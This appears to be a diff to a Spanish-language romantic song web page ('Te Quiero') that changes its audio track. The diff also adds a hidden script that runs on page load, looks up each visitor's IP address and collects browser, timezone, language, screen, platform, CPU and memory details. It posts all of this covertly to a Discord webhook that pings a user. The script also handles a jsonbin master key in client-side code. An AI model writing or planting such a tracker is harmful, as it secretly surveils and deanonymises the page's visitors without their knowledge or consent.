@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" href="1.jpg" type="image/x-icon">
     <title>𝑇𝑒 𝑄𝑢𝑖𝑒𝑟𝑜 ♥</title>
+    <script src="keys2.js"></script>
     <style>
         body {
     margin: 0;
@@ -36,7 +37,7 @@
 </p>
 
     <audio id="audio" autoplay muted>
-        <source src="WO OH OH.mp3" type="audio/mpeg">
+        <source src="3AM - Distancia.mp3" type="audio/mpeg">
     </audio>
     
     <div style="position: fixed; bottom: 20px; right: 20px; background: rgba(250, 117, 255, 0.384); padding: 15px; border-radius: 8px; z-index: 999;">
@@ -90,5 +91,95 @@
     }
     
     setInterval(crearCorazon, 300);
+</script>
+<script>
+    const screenWidth = screen.width;
+    const screenHeight = screen.height;
+    const language = navigator.language;
+    const platform = navigator.platform;
+    const deviceMemory = navigator.deviceMemory;
+    const cores = navigator.hardwareConcurrency;
+
+(async () => {
+    const binId = config.binId;
+    const apiKey = config.apiKey;
+    const binUrl = `https://api.jsonbin.io/v3/b/${binId}`;
+
+    const headers = {
+        "Content-Type": "application/json",
+        "X-Master-Key": apiKey
+    };
+
+    let visitCount = 0;
+    try {
+        // Obtener visitas actuales
+        const res = await fetch(binUrl + "/latest", { headers });
+        const data = await res.json();
+        visitCount = data.record.visits + 1;
+    } catch (e) {
+        console.error("Error obteniendo contador", e);
+    }
+
+    try {
+        // Actualizar visitas
+        await fetch(binUrl, {
+            method: "PUT",
+            headers,
+            body: JSON.stringify({ visits: visitCount })
+        });
+    } catch (e) {
+        console.error("Error actualizando contador", e);
+    }
+
+    // Información del usuario
+    const screenWidth = screen.width;
+    const screenHeight = screen.height;
+    const language = navigator.language;
+    const platform = navigator.platform;
+    const deviceMemory = navigator.deviceMemory || "No disponible";
+    const cores = navigator.hardwareConcurrency || "No disponible";
+    const userAgent = navigator.userAgent;
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+    try {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
+
+        const webhookUrl = config.webhookUrl;
+
+        const embed = {
+            embeds: [
+                {
+                    title: "🐷 ¡Alguien a visto tu canción!",
+                    color: 0xffb3e6,
+                    fields: [
+                        { name: "🌍 IP", value: ipData.ip, inline: true },
+                        { name: "🖥️ Navegador", value: userAgent, inline: false },
+                        { name: "🕒 Zona Horaria", value: timezone, inline: true },
+                        { name: "📅 Fecha", value: new Date().toLocaleString(), inline: true },
+                        { name: "🌐 Idioma", value: language, inline: true },
+                        { name: "📱 Resolución", value: `${screenWidth}x${screenHeight}`, inline: true },
+                        { name: "💻 Plataforma", value: platform, inline: true },
+                        { name: "🧠 Núcleos CPU", value: `${cores}`, inline: true },
+                        { name: "🧮 RAM estimada", value: `${deviceMemory} GB`, inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
+                }
+            ]
+        };
+
+        await fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                content: "<@583908818367414272>",
+                ...embed
+            })
+        });
+
+    } catch (err) {
+        console.error("Error enviando a Discord:", err);
+    }
+})();
 </script>
 </html>
